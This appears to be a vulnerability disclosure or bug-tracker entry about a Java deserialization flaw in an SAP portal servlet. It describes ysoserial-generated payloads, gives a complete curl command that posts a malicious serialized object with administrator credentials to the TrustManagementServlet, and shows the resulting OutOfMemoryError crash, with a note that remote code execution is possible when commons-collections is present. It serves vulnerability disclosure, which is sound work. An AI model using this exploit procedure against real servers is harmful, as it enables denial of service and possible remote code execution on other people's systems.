Evil object in 'serial.cc3' as an attachment in this bug entry. It was generated with ysoserial framework, if the commons.collections jar was in the CLASSPATH we will have direct RCE.
Now, we can only send DOS payloads that will trigger OutOfMemory exception on 7.5. Payload for that as attachment named 'serial.mem'.

```
curl -v -XPOST --user 'Administrator:123QWEasd' http://172.16.30.29:50000/com.sap.portal.fpn.enterpriseservicesweb.mod/TrustManagementServlet --data-binary @serial.cc3
```

This request will trigger a series of exceptions in server's log.

The DOS payload will render the server unstable for some minutes with following exception:

Server process shutting down with exit code [666] memory allocation error [OutOfMemoryError]
java.lang.OutOfMemoryError: Requested array size exceeds VM limit (failed to allocate 8589934576 bytes) (array length 2147483639)
